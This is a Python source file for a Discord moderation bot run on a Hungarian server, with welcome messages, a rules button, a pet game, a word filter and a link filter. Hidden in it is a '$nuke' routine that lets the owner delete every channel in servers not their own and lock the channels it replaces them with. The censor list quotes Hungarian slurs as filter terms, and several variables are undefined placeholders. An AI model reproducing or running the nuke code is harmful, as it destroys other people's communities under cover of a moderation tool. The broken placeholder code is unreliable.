import discord
from discord.ext import commands
from discord.ext.commands import bot
from discord.ui import View, Button, button
import time
import random
import requests
import asyncio
import datetime
import json
import os
import re
# from chatterbot import ChatBot
# from chatterbot.trainers import ChatterBotCorpusTrainer

# chatbot = ChatBot('Hungarian')

# Create a new trainer for the chatbot
# trainer = ChatterBotCorpusTrainer(chatbot)

# Train the chatbot based on the hungarian corpus
# trainer.train("chatterbot.corpus.hungarian")

# api_url = "https://api.openai.com/v1/engines/turbo-small/completions"
# api_key = "api_key"

# headers = {
    # "Authorization": f"Bearer {api_key}",
    # "Content-Type": "application/json"
# }

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True

client = discord.Client(intents=intents)
global_counter = 1
my_servers = [
]

testers = [ 
]
admins = [
]

async def load_users_pets():
    data = {}
    return data

async def fetch_gif_emojis(ctx):
    gif_emojis = [emoji for emoji in ctx.guild.emojis if emoji.animated]
    for emoji in gif_emojis:
        print(emoji.name, emoji.url)

@client.event
async def on_member_remove(member):
    server = member.guild
    if member.guild.id !=memberid:
        return
    
    channel = discord.utils.get(member.guild.channels, id=id)
    icon_url = ''
    member_id = member.id
    member_name = member.name
    if member.avatar == None: 
        icon_url = member.display_avatar
    else:
        icon_url = member.avatar

    if channel:
        description = f'**<a:gif_jeges13:1123891453127565352>I hate you!!!<a:gif_jeges13:1123891453127565352>**\n- You left me!!!\n- Alone!!!\n- Arghhhh!!!'
        embed = discord.Embed(
            title='',
            description=description, 
            color=0xffffff
            )
        embed.set_author(name=f'{member_name}', icon_url=f'{icon_url}')
        embed.set_image(url='https://hl2c.pythonanywhere.com/media/frontend/knives_out.jpg')
        await asyncio.sleep(random.uniform(0.11, 0.21))
        await channel.send( f"<@{member_id}>" )
        await asyncio.sleep(random.uniform(0.51, 0.61))
        await channel.send(embed=embed)

@client.event
async def on_member_join( member ):
    if member.guild.id !=1094164017179787387:
        return
    channel = discord.utils.get(member.guild.channels, id=1094168472604393492)
    role = discord.utils.get(member.guild.roles, name='Tag/Member')
    # channel = client.get_channel(1094168472604393492)
    icon_url = ''
    member_id = member.id
    member_name = member.name
    if member.avatar == None: 
        icon_url = member.display_avatar
    else:
        icon_url = member.avatar

    if channel:
        description = f'**<a:gif_jeges13:1123891453127565352>Welcome to my Server<a:gif_jeges13:1123891453127565352>**\n- Please read **rules** \n- Select your **roles**\n- Have Fun'
        embed = discord.Embed(
            title='',
            description=description, 
            color=0xffffff
            )
        embed.set_author(name=f'{member_name}', icon_url=f'{icon_url}')
        embed.set_image(url='https://hl2c.pythonanywhere.com/media/frontend/0f8ef773-6c2e-43f2-b1f5-cddc71730e9a.gif')
        await member.add_roles(role)
        await asyncio.sleep(random.uniform(0.11, 0.21))
        await channel.send( f"<@{member_id}>" )
        await asyncio.sleep(random.uniform(0.51, 0.61))
        await channel.send(embed=embed)



#
# Lets Make a Nuke Method haha
#
async def server_hahaha( cn ):
    
    server_id = cn.guild.id
    guild = client.get_guild(server_id) 
    bot_id = botid # client.application_id
    bot = discord.utils.get(guild.members, id=bot_id)
    if server_id == serverid:
        return
        
    print( f'Someone Called the Nuke on Server({server_id})')   
    
    channels = cn.guild.channels
    for channel in channels: # Get all the channels
        await asyncio.sleep(random.uniform(2.11, 3.21)) 
        await channel.delete() # Delete them in the loop
        
    await asyncio.sleep(random.uniform(2.11, 3.21))
    
    guild = client.get_guild(server_id) # replace GUILD_ID with the ID of your guild
    ctx = await guild.create_text_channel('te') # replace 'new-channel' with the name of your new channel
    role = discord.utils.get(guild.roles, name="@everyone")
    overwrite = discord.PermissionOverwrite()
    overwrite.view_channel = True
    overwrite.send_messages = False
    overwrite.read_messages = True
    overwrite.read_message_history = True
    await ctx.set_permissions(role, overwrite=overwrite)
    overwrite = discord.PermissionOverwrite()
    overwrite.send_messages = True
    await ctx.set_permissions(bot, overwrite=overwrite)
    
    await asyncio.sleep(random.uniform(2.11, 3.21))
    
    ctx = await guild.create_text_channel('egy') # replace 'new-channel' with the name of your new channel
    role = discord.utils.get(guild.roles, name="@everyone")
    overwrite = discord.PermissionOverwrite()
    overwrite.view_channel = True
    overwrite.send_messages = False
    overwrite.read_messages = True
    overwrite.read_message_history = True
    await ctx.set_permissions(role, overwrite=overwrite)
    overwrite = discord.PermissionOverwrite()
    overwrite.send_messages = True
    await ctx.set_permissions(bot, overwrite=overwrite)
    
    await asyncio.sleep(random.uniform(2.11, 3.21))
    
    ctx = await guild.create_text_channel('kutya') # replace 'new-channel' with the name of your new channel
    role = discord.utils.get(guild.roles, name="@everyone")
    overwrite = discord.PermissionOverwrite()
    overwrite.view_channel = True
    overwrite.send_messages = False
    overwrite.read_messages = True
    overwrite.read_message_history = True
    await ctx.set_permissions(role, overwrite=overwrite)
    overwrite = discord.PermissionOverwrite()
    overwrite.send_messages = True
    await ctx.set_permissions(bot, overwrite=overwrite)
    
    await asyncio.sleep(random.uniform(2.11, 3.21))
    
    ctx = await guild.create_text_channel('vagy') # replace 'new-channel' with the name of your new channel
    role = discord.utils.get(guild.roles, name="@everyone")
    overwrite = discord.PermissionOverwrite()
    overwrite.view_channel = True
    overwrite.send_messages = False
    overwrite.read_messages = True
    overwrite.read_message_history = True
    await ctx.set_permissions(role, overwrite=overwrite)
    overwrite = discord.PermissionOverwrite()
    overwrite.send_messages = True
    await ctx.set_permissions(bot, overwrite=overwrite)

async def pet_save():
    with open('pets.json', 'w') as f:
        json.dump(pets, f)

async def pet_create( id ):
    pets['users'].append({'id':id,"food": 10,"playing":1,"training":0,"training_days":0,"trained":[1],"last_food":"2023-12-31","last_train": "2023-12-31","version": 1})
    # print(pets['users'])
    await pet_save()
    
async def pet_check( id ):
    for result in pets['users']:
        if result['id'] == id:
            print('User Has Pet No Need To Create New One')
            return
    await pet_create( id )
    return
def pet_playing_id( id ):
    for result in pets['users']:
        if result['id'] == id:
            return result['playing']
def pet_training_name(id):
    name = 'HIBA'
    for result in pets['trainlist']:
        if id == result['id']:
            name = result['name']
            break
            
    return name
    
def pet_training_days(id):
    days = 666
    for result in pets['trainlist']:
        if id == result['id']:
            name = result['days']
            break
            
    return days
def pet_food(id):
    food = 10
    for result in pets['users']:
        if id == result['id']:
            name = result['food']
            break
            
    return food
    
async def pet_system( channel, name, id ):
    name = name
    id = id
    await pet_check( id )
    playing_id = pet_playing_id( id )
    playing_name = pet_training_name( playing_id )
    food = pet_food( id )
    title = f'{name} Medvéje'
    description = f'Állapota:\n- Tevékenységet végzi: **{playing_name}**\n- Étel: 10 / **10**\nTanulás:\n- Tanulja: **Valami**\n- Ennyi napja van: **Napok**'
    embed = discord.Embed(title=title, description=description, color=0x0ffffff)
    image = f"http://hl2c.pythonanywhere.com/media/frontend/train/{playing_id}.gif"
    embed.set_image(url=image)
    await channel.send(embed=embed)
    return


class VoteButtons(discord.ui.View):
    def __init__(self, *, timeout=0):
        super().__init__(timeout=timeout)
        self.add_item(Button(style=discord.ButtonStyle.url, label="Top.GG", url=""))
        self.add_item(Button(style=discord.ButtonStyle.url, label="Discadia", url=""))
    # @discord.ui.button(label="Top.GG",style=discord.ButtonStyle.url,url="")
    # async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        # return
    # @discord.ui.button(label="Discadia",style=discord.ButtonStyle.url,url="")
    # async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        # return
        


async def vote_button(cn):
    # await cn.send("Szavazattok PLZ!",view=VoteButtons())
    embed = discord.Embed(title='<:jeges16:1097812537682173962>Szavazzatok<:jeges16:1097812537682173962>', description='<:jeges16:1097812537682173962>Kéne sok szavazzat jól esne<:jeges16:1097812537682173962>', color=0x0ffffff)
    await cn.send(embed=embed, view=VoteButtons())

class RulesAgree(discord.ui.View):
    def __init__(self, *, timeout=None):
        super().__init__(timeout=timeout)
    @discord.ui.button(label="Elfogadás / Agree",style=discord.ButtonStyle.green, custom_id="agree", disabled=False)
    async def agree_click(self, interaction: discord.Interaction, button: discord.ui.Button):
        current_channel = interaction.channel
        member = interaction.user
        role = discord.utils.get(current_channel.guild.roles, name='Verified')
        
        await interaction.response.edit_message(view=self)
        await asyncio.sleep(0.1)
        await member.add_roles(role)
        
    
async def set_rules(cn):
    title = 'Szabályok / Rules'
    description = '**:flag_hu:Magyar:flag_hu:**\n- <a:gif_jeges26:1165956012101074994>Ne Leakelj\n- <a:gif_jeges26:1165956012101074994>Ne spammelj\n- <a:gif_jeges26:1165956012101074994>Ne reklámozz\n- <a:gif_jeges26:1165956012101074994>Ne élj vissza a rangoddal\n- <a:gif_jeges26:1165956012101074994>Beefben nincs Timeout\n- <a:gif_jeges26:1165956012101074994>Tiszteld a másikat minden szobában kivéve Beef\n- <a:gif_jeges26:1165956012101074994>Csak Beef szobában beefelj\n- <a:gif_jeges26:1165956012101074994>A szobákat a megfelelő célra használd\n- <:jeges26:1113427931449004042>Ne sírj az Adminnak\n\n**:flag_gb:English:flag_gb:**\n- <a:gif_jeges26:1165956012101074994>No Leaks\n- <a:gif_jeges26:1165956012101074994>No Spams\n- <a:gif_jeges26:1165956012101074994>No Ads\n- <a:gif_jeges26:1165956012101074994>Dont abuse your role\n- <a:gif_jeges26:1165956012101074994>No Timeout in Beef\n- <a:gif_jeges26:1165956012101074994>Respect others except in Beef channels\n- <a:gif_jeges26:1165956012101074994>Only Beef in Beef channels\n- <a:gif_jeges26:1165956012101074994>Use the channels for their goal\n- <:jeges26:1113427931449004042>Dont cry to Admins\n\n**<a:gif_jeges11:1123988577882210323>Szabályzat elfogadásához nyomd meg a gombot és láthatod a többi csatornát**\n**<a:gif_jeges11:1123988577882210323>For Rules agreement you must press the button to see all channels**'
    embed = discord.Embed(
        title=title, 
        description=description,
        color=0xffffff
    )
    embed.set_image(url='https://hl2c.pythonanywhere.com/media/frontend/jeges_rules.gif')
    await cn.send(embed=embed,view=RulesAgree())

async def embed( cn, message ):
    text = message.content
    await message.delete()
    txt = text.split(' ')
    if len(txt)>=2:
        directory = '/home/container'
        # Get the list of files in the directory
        # files = os.listdir( directory )
        # Print the list of files
        # print(files)
        name = txt[1]
        print( 'Filename Looking for: ' + name )
        filename = name + '.json'
        filepath = os.path.join(directory, filename)
        # path = '/home/container/' + filename
        with open(filepath, 'r') as f:
            data = json.load(f) 
            print(data['backups'][0]['messages'][0]['data']['embeds'][0])
            print(data['version'])
    else:
        await cn.send('Missing Filename Please Try Next Time')
    
    return
    
def read_counters():
    t = {}
    with open('counters.json', 'r') as f:
        t =json.load(f)
    # print( t )
    return t
    
def read_counter(name):
    r = 1
    with open('counters.json', 'r') as f:
        r = json.load(f)[name]
    # print( r )
    return r
        
def add_counter( name, number ):
    r = 1
    t = {}
    with open('counters.json', 'r') as f:
        t = json.load(f)
        r = t[name]
    if r:
        if r > 9999:
            r = 1
        else:
            r = r + number
        t[name] = r
        with open('counters.json', 'w') as f:
            json.dump(t, f)
    number = number + 1
    return number 

badlinks = ['t.me','bunkrr','gamgingfun.me','mega.nz','cyberdrop','discord.com/invite','https://discord.com/invite','http://discord.com/invite','discord.gg','https://discord.gg','http://discord.gg']
censors = ["fasz", "kurva", "pina", "puna", "punci", "szopj", "ribi", "hulye", "taknyos", "kocsog", "luzer", "strici", "betorom", "szaros", "bevertem apad", "idiota", "szopdki", "szopd ki", "halott az apja", "kiverem a fogat", "leszakitom az agyad", "le szakitom az agyad", "kituzom apad", "halott az apad", "megollek", "megolek", "cigany", "cigo", "vereb", "@everyone", "@here", "@apad fejet", "betorjem a feje", "kivegzem apad", "pocs", "szar", "fos", "\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u281f\u281b\u2889\u2889\u2809\u2809\u283b\u28ff", "\u534d", "fogyatekos", "agyhalott", "agy halott", "budos kurva", "ruppotlan", "buzi", "geci", "faszom", "gecibe", "kurvak", "leszop", "anal", "fasszopo", "megkurtam", "leszarom", "basztam", "old", "budoskurva", "\u28ff", "\u281f", "\u281b", "\u2889", "\u2809", "\u283b"]
pets = {
    'users': [
        {
            'id': userid,
            'food': 10,
            'playing': 1,
            'training': 0,
            'training_days': 0,
            'trained': [1],
            'last_food': '2023-12-31',
            'last_train': '2023-12-31',
            'version': 2,
        },
    
    ],
    'trainlist': [
        {
            'id': 1,
            'name': 'Táncolni',
            'days': 10,
        },
        {
            'id': 2,
            'name': 'Pénzen fetrengeni',
            'days': 12,
        },
        {
            'id': 3,
            'name': 'Felöltözni fetrengeni',
            'days': 13,
        },
        {
            'id': 4,
            'name': 'Pózolni',
            'days': 9,
        },
        {
            'id': 5,
            'name': 'Kutyázni',
            'days': 11,
        },
        {
            'id': 6,
            'name': 'Kávét főzni',
            'days': 15,
        },
        {
            'id': 7,
            'name': 'Főzni',
            'days': 18,
        },
        {
            'id': 8,
            'name': 'Robot harcolni',
            'days': 7,
        },
        {
            'id': 9,
            'name': 'Vakarózni',
            'days': 8,
        },
        {
            'id': 10,
            'name': 'Ölelkezni',
            'days': 3,
        },
        {
            'id': 11,
            'name': 'Kosarazni',
            'days': 5,
        },
        {
            'id': 12,
            'name': 'Tálalni',
            'days': 11,
        },
        {
            'id': 13,
            'name': 'Zongorázni',
            'days': 14,
        },
        {
            'id': 14,
            'name': 'Lefeküdni aludni',
            'days': 9,
        },
        {
            'id': 15,
            'name': 'Olvasni és enni',
            'days': 13,
        },
    ]
}
if not ( os.path.isfile('censors.json') ):
    with open('censors.json', 'w') as f:
        json.dump(censors, f)
if not ( os.path.isfile('badlinks.json') ):
    with open('badlinks.json', 'w') as f:
        json.dump(badlinks, f)
if not ( os.path.isfile('pets.json') ):
    with open('pets.json', 'w') as f:
        json.dump(pets, f)
with open('censors.json', 'r') as f:
        censors = json.load(f)
with open('pets.json', 'r') as f:
        pets = json.load(f)
@client.event
async def on_ready():
    json_data = {
        "counter1": 1,
        "counter2": 1,
        "counter3": 1
    }
    with open('counters.json', 'w') as f:
        json.dump(json_data, f)
    
    servers = client.guilds
    for server in servers:
        if server.id == server_id:
            print('Jeges Medve Init')
            client.add_view(RulesAgree())

def add_censor_message( add ):
    check = False
    if len(add)<1:
        return check
    if add in censors:
        return check
    else:
        censors.append(add)
        with open('censors.json', 'w') as f:
            json.dump(censors, f)
def censor_message( cn, message, text ):
    
    text = text.lower()
    text = text.replace('á', 'a')
    text = text.replace('ä', 'a')
    text = text.replace('é', 'e')
    text = text.replace('ó', 'o')
    text = text.replace('ö', 'o')
    text = text.replace('ő', 'o')
    text = text.replace('ú', 'u')
    text = text.replace('ü', 'u')
    text = text.replace('ű', 'u')
    
    check = False
    # if text in censors:
        # check = True
    for result in censors:
        if re.search( result, text ):
            check = True
            break
    return check
def badlinks_message( cn, message, text ):
    check = False
    # if message.author.id == user_id:
        # return False
    text = text.lower()
    text = text.strip()
    # match = re.search(r"(discord\.gg|discordapp\.com/invite)/([a-zA-Z0-9]+)", text)
    match = re.search(r"(teenleaks\.xyz)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check    
        
    match = re.search(r"(discord\.gg|discord\.com/invite|discordapp\.com/invite)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check    
    
    match = re.search(r"(tiktok\.com)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
    
    match = re.search(r"(cyberdrop\.com|cyberdrop\.net|cyberdrop\.org)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
    
    match = re.search(r"(dpdz\.xyz)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
        
    match = re.search(r"(verham93\.de)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
        
    match = re.search(r"(t\.me|telegram\.com)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
        
    match = re.search(r"(pornhub\.com)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
        
    match = re.search(r"(thothub\.com|thothub\.ru|thothub\.su)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
        
    match = re.search(r"(mega\.io|mega\.com|mega\.nz)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
        
    match = re.search(r"(bunkrr\.su|bunkrr\.com|bunkrr\.ru|bunkrr\.sk|bunkr\.su|bunkr\.com|bunkr\.ru|bunkr\.sk)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
        
    match = re.search(r"(tg\.com)", text)
    if match:
        check = True
        print('Found Bad Link')
        return check
        
    if text in badlinks:
        check = True
        print('Found Bad Link')
    # print(text)
    # for link in badlinks:
        # pattern = rf"(?<={link}[^{link}])\w"
        # matches = re.findall(pattern, text)
        # for match in matches:
            # check = True
            # print('Found Bad Link')
        
    return check

@client.event
async def on_message( message ):
    
    channel = message.channel
    channel_id = channel.id
    server_id = channel.guild.id
    sender_id = message.author.id
    sender_name = message.author.name
    messages = []
    admin_id = admin_id # ME ICEMAN
    mate_id = mateid
    sa = []
    sa.append(admin_id)
    sa.append(mate_id)
    beefs = [channelid]
    if message.author == client.user:
        return
    
    
    
    if message.content.startswith('$nuke') and ( sender_id == admin_id or sender_id == id ) and not ( server_id in my_servers):
        await server_hahaha( channel )
        return
    
    if not server_id in my_servers:
        return
    
    # Some Exception Channels for my stuff
    if not (sender_id in admins) and badlinks_message( channel, message, message.content ):
        await asyncio.sleep(4.1)
        await message.delete()
        # mention = message.author.mention
        # await channel.send(f'Csúnyán beszéltél {mention}. Ezért töröltem az üzeneted. Mosd ki a fogad!!!')
        return
        
    # if not (channel_id in beefs) and censor_message( channel, message, message.content ):
    if not (channel_id in beefs) and not (sender_id in admins) and censor_message( channel, message, message.content ):
        await asyncio.sleep(4.1)
        try:
            await message.delete()
        except:
            pass
        mention = message.author.mention
        try:
            await asyncio.sleep(4.1)
            await channel.send(f'Csúnyán beszéltél {mention}. Ezért töröltem az üzeneted. Mosd ki a fogad!!!\nHa annyira csúnyán akarsz beszélni vagy beefelni menj ide:\n:flag_hu: <#1163865681012473866>\n:flag_gb: <#1186669663409672262>')
        except:
            pass
        return
    
    if message.content.startswith('$censor ') and ( message.author.id == admin_id or message.author.id in testers ):
        texts = message.content
        await asyncio.sleep(1.1)
        try:
            await message.delete()
        except:
            pass
        texts = texts.replace('$censor ', "")
        if len(texts)>1:
            add_censor_message(texts)
        return
        
    if message.content.startswith('$gifemojis') and ( message.author.id == admin_id or message.author.id in testers ):
        await asyncio.sleep(1.1)
        await message.delete()
        await asyncio.sleep(1.1)
        await add_censor_message( '' )
        return
        
    if message.content.startswith('$rules') and ( message.author.id == admin_id or message.author.id in testers ):
        await asyncio.sleep(1.1)
        await message.delete()
        await asyncio.sleep(1.1)
        await set_rules( channel )
        return 
        
    if message.content.startswith('$vote') and ( message.author.id == admin_id or message.author.id in testers ):
        await asyncio.sleep(1.1)
        await message.delete()
        await asyncio.sleep(1.1)
        await vote_button(channel)
        return
    if message.content.startswith('$pet') and ( message.author.id == admin_id or message.author.id in testers ):
        await asyncio.sleep(4.1)
        try:
            await message.delete()
        except:
            pass
        await asyncio.sleep(4.1)
        await pet_system( channel, sender_name, sender_id )
        return
    if message.content.startswith('$embed') and ( message.author.id == admin_id or message.author.id in testers ):
        await asyncio.sleep(1.1)
        await embed( channel, message )
        return
            
    if message.content.startswith('$delete ') and ( message.author.id in admins ):
        limit = 1
        message_content = message.content 
        texts = message_content.replace('$delete ', "")
        
        
        if len(texts)>0 and texts.isdigit():
            limit = int(texts)
            if limit < 1:
                limit = 1
            elif limit > 100:
                limit = 100
        await asyncio.sleep( random.uniform(3.11, 4.21) )
        try:
            await message.delete()
        except discord.HTTPException:
            pass
        async for message in channel.history(limit=limit):
            messages.append(message)
        for msg in messages:
            message_id = msg.id
            message_author_id = msg.author.id
            current_datetime = datetime.datetime.now()
            year = current_datetime.year
            month = current_datetime.month
            day = current_datetime.day
            hour = current_datetime.hour
            minute = current_datetime.minute
            second = current_datetime.second
            await asyncio.sleep( random.uniform(3.11, 4.21) )
            try:
                await msg.delete()
            except discord.HTTPException:
                print('Error in Deleting Messages')
                pass
            print(f"({year}-{month}-{day} {hour}:{minute}:{second})Message ({message_id}) Author ({message_author_id}) Deleted.")
        return

            
client.run(token)
